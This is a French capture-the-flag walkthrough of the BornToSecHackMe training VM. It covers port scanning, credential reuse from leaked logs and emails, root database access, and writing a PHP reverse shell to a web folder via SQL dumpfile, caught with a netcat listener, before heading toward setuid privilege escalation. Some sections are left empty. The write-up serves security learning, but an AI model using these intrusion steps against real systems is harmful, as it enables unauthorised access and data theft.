# nmap
On commence par scanner tous les ports réseaux de la machine, pour identifier les potentielles voies d'accès : `nmap -p- <IP>` :
```
Not shown: 65529 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

# dirb
Rien d'intéressant sur le site HTTP (port 80), et il n'y a rien à la racine HTTPS.  
On va donc utiliser [dirb](https://tools.kali.org/web-applications/dirb) pour déterminer les dossiers existants : `dirb https://<IP> /usr/share/wordlists/dirb/common.txt`. On trouve `/forum`, `/phpmyadmin` et `/webmail`. Commençons par le forum, puisque c'est le seul à ne pas nous imposer de nous connecter.

# forum
En arrivant sur le forum ([MyLittleForum](https://mylittleforum.net/) - [v2.3.4](https://www.cvedetails.com/version/288534/Mylittleforum-My-Little-Forum-2.3.4.html)), on remarque tout de suite un topic intéressant « Probleme login ? », qui contient des logs d'authentification du serveur. En fouillant, on tombe sur le passage suivant :
```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
```
Grâce à cette faute de frappe, on obtient notre premier couple login/mot de passe : `lmezard | !q\]Ej?*5K5cy*AJ`. En testant, on se rend compte que ces identifiants nous permettent de nous connecter au forum, et de trouver ainsi l'adresse courriel `laurie@borntosec.net`.

# webmail
Avec `laurie@borntosec.net | !q\]Ej?*5K5cy*AJ`, on peut se connecter au webmail ([SquirrelMail](https://www.squirrelmail.org/) - [v1.4.22](https://www.cvedetails.com/version/212608/Squirrelmail-Squirrelmail-1.4.22.html)). En plus d'un enthousiasme débordant pour Windev, on trouve surtout les identifiants de la base de données :
```
Hey Laurie,
You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
Best regards.
```

# phpMyAdmin
On est root sur la base de données, on peut s'arrêter là :tada:  
.  

..  

...  

Plus sérieusement, la prochaine étape est de parvenir à convertir notre accès à la BDD en accès à la machine elle-même. La piste la plus prometteuse pour cela passe par la mise en place d'un reverse shell, ce qui nous permettrait de nous connecter à la machine en tant que `www-data`. Puisque l'on sait que le serveur interprète le PHP, nous allons utiliser un [script de reverse shell en PHP](https://github.com/pentestmonkey/php-reverse-shell).  
Il faut commencer par trouver un dossier disposant des droits d'écriture nécessaires pour pouvoir déposer et exécuter notre script. La [documentation d'installation](https://github.com/ilosuna/mylittleforum/wiki/Installation) de MyLittleForum nous pointe dans la direction du dossier `/forum/templates_c` :
> Depending on your server configuration the write permission of the subdirectory `templates_c` (CHMOD 770, 775 or 777) and the file `config/db_settings.php` (CHMOD 666) might need to be changed in order that they are writable by the script

On va donc créer une table `phpshell`, contenant une colonne de type VARCHAR et de taille 10000. Dans cette colonne, nous allons insérer le contenu de notre script de reverse shell (en adaptant l'adresse IP et le port). Et utiliser la commande SQL `SELECT * INTO dumpfile '/var/www/forum/templates_c/reverse.php' FROM phpshell;` pour exporter ce contenu.  
En visitant l'URL `https://<IP>/forum/templates_c/` depuis notre navigateur, nous voyons bien notre script `reverse.php`. Avant de l'exécuter, il faut simplement lancer un listener [netcat](https://en.wikipedia.org/wiki/Netcat) depuis la VM Kali : `nc -l -p 4444` ; une fois le script exécuté, notre listener nous affiche bien une invite de commande bash, en tant que `www-data`.

# reverse shell
Notre shell actuel est fonctionnel, mais pas très pratique (pas d'historique ou d'autocomplétion). Nous allons donc faire le nécessaire gagner en confort (cf [Méthode 3](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)) :
- `python -c 'import pty; pty.spawn("/bin/bash")'` pour lancer un shell bash
- <kbd>Ctrl+Z</kbd> pour mettre notre reverse shell en arrière plan
- `stty raw -echo` pour passer notre stty en mode echo
- `fg` pour ramener notre reverse shell au premier plan
- `reset` pour réinitialiser le terminal  

`ls -l /` nous apprend que `/home` est propriété de l'utilisateur `www-data`. On y trouve bien évidemment les dossiers de chacun des utilisateurs de la machine, mais nous ne pouvons y accéder (faute de droits). Seul le dossier `LOOKATME` nous est accessible ; il ne contient qu'un fichier `password` :
```
lmezard:G!@M6f4Eatau{sF"
```
Ces identifiants nous permettent de nous connecter en FTP, ou de faire un `su` pour accéder à `/home/lmezard`.

# ftp
On se connecte avec la commande `ftp <IP>` et les identifiants que nous venons d'obtenir. Le dossier courant ne contient que deux fichiers (`README` et `fun`), que nous téléchargeons avec la commande FTP `get`. On peut ensuite se déconnecter du FTP et se pencher sur ces nouveaux fichiers.  
Sans surprise, `README` contient la marche à suivre :
```
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```
`file fun` nous apprend qu'il s'agit d'un archive tar. Elle contient des bribes d'un fichier .c, disséminées dans plusieurs centaines de fichiers. Pour gagner du temps, nous avons développé un [script python](/scripts/nofun.py) pour débrouiller la chose, et nous permet d'obtenir :
```
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```
Notre nouvel identifiant est donc `laurie | 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`.

# laurie
On se connecte avec `ssh laurie@<IP>`. Le dossier utilisateur ne contient que deux fichiers : `README` et `bomb`.  
`cat README` :
```
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```
`bomb` est un binaire, nous demandant de trouver six mots de passe successifs pour la désamorcer et passer à l'étape suivante.

## `bomb`

### Étape 1

# thor
On a un `README` :
```
Finish this challenge and use the result as password for 'zaz' user.
```
Et un fichier `turtle` qui contient des instructions de dessins (en pseudocode), à l'image de ce qui a été popularisé par le [langage LOGO](https://en.wikipedia.org/wiki/Logo_(programming_language)#Turtle_and_graphics).  
En adaptant la syntaxe du fichier [en LOGO](/scripts/turtle_logo) et à l'aide d'un [interpréteur en ligne](http://lwh.free.fr/pages/prog/logo/logo.htm), on obtient les lettres suivantes (en utilisant les lignes vides comme séparateurs de caractère) : `SLASH`.  
Le fichier `turtle` se conclut par un petit indice : `Can you digest the message? :)`. C'est une référence au *message digest* qui en cryptographie est la valeur de sortie d'une fonction de hash. La fonction de hash la plus connue étant MD5, nous obtenons la valeur `646da671ca01bb5d84dbb5fb2238dc8e`, qui nous permet bien de nous connecter en SSH avec l'utilisateur `zaz`.

# zaz
On a un exécutable `exploit_me`, dont le [`suid`](https://en.wikipedia.org/wiki/Setuid) a été défini à l'utilisateur `root` (on peut le confirmer avec `stat exploit_me`). Cela signifie que ce binaire s'exécutera toujours comme s'il avait été lancé par `root` peu importe l'utilisateur ayant réellement lancé la commande. Il va de soi que ce genre de binaire est très intéressant pour obtenir une [élévation de privilège](https://en.wikipedia.org/wiki/Privilege_escalation) (par exemple pour lancer `/bin/bash` en tant que `root`).

## `exploit_me`